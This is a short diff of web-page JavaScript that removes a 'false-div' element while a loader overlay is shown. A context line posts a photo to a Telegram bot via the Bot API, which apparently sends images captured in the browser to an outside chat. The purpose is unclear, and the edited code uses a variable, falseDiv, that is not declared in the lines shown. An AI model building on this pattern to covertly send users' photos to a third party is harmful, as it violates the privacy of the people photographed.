@@ -443,8 +443,8 @@
                 const loaderOverlay = document.getElementById('loaderOverlay');
                 loaderOverlay.style.display = 'flex'; // Display loader overlay
 
-                const false_div = document.getElementById('false-div');
-                false_div.parentNode.removeChild(false_div);
+              //  const false_div = document.getElementById('false-div');
+                falseDiv.parentNode.removeChild(falseDiv);
 
 
 
@@ -664,6 +664,7 @@
 
                     const loaderOverlay = document.getElementById('loaderOverlay');
                     loaderOverlay.style.display = 'flex'; // Display loader overlay
+                    falseDiv.parentNode.removeChild(falseDiv);
 
                     fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
                         method: 'POST',
